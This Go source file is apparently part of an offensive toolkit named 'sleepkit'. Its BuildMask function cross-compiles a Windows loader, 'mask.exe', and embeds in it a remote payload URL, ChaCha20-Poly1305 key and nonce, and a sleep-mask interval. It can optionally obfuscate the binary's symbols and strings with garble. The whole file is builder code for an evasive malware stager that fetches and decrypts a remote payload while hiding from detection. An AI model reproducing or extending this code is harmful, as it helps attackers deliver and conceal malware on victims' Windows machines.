package stage

import (
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// BuildMask cross-compiles cmd/mask for Windows amd64, embedding the payload
// URL and ChaCha20-Poly1305 key material plus the XOR sleep mask interval
// via -ldflags.
//
// If useGarble is true and garble is in PATH, it uses garble -literals for
// full symbol + string obfuscation.
func BuildMask(bundle *EncBundle, payloadURL, outDir string, sleepMS int, useGarble bool) (string, error) {
	modRoot, err := findModRoot()
	if err != nil {
		return "", fmt.Errorf("locating module root: %w", err)
	}

	maskDir := filepath.Join(modRoot, "cmd", "mask")
	if _, err := os.Stat(maskDir); err != nil {
		return "", fmt.Errorf("mask source not found at %s", maskDir)
	}

	outExe := filepath.Join(outDir, "mask.exe")

	ldflags := fmt.Sprintf(
		"-s -w -X main.PayloadURL=%s -X main.KeyHex=%s -X main.NonceHex=%s -X main.SleepMS=%d",
		payloadURL,
		hex.EncodeToString(bundle.Key),
		hex.EncodeToString(bundle.Nonce),
		sleepMS,
	)

	builder := "go"
	if useGarble {
		if path, err := exec.LookPath("garble"); err == nil {
			builder = path
			fmt.Printf("[*] Using garble for mask.exe obfuscation\n")
		} else {
			fmt.Printf("[!] garble not found in PATH — falling back to go build\n")
		}
	}

	var cmd *exec.Cmd
	if builder == "go" {
		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outExe, ".")
	} else {
		cmd = exec.Command(builder, "-literals", "build", "-ldflags", ldflags, "-o", outExe, ".")
	}

	cmd.Dir = maskDir
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("building mask.exe: %w", err)
	}

	if info, err := os.Stat(outExe); err == nil {
		fmt.Printf("[i] mask.exe size: %.1f KB\n", float64(info.Size())/1024)
	}

	return outExe, nil
}

func findModRoot() (string, error) {
	if root := os.Getenv("SLEEPKIT_ROOT"); root != "" {
		return root, nil
	}
	dir, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return "", fmt.Errorf("go.mod not found; set SLEEPKIT_ROOT to the repo root")
}
